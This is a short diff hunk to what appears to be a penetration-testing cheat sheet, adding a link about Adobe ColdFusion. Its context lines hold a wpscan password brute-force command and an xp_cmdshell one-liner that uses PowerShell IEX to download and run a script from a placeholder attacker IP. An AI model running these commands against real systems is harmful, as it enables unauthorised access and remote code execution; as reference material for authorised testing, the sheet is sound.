@@ -425,3 +425,6 @@ wpscan -U <username> -P wordlist.txt --url http://url/wordpress
 ```
 xp_cmdshell powershell IEX(New-Object Net.WebClient).downloadstring("http://<IP>/powershellscript.ps1")
 ```
+
+### Adobe Cold Fusion
+https://www.carnal0wnage.com/papers/LARES-ColdFusion.pdf
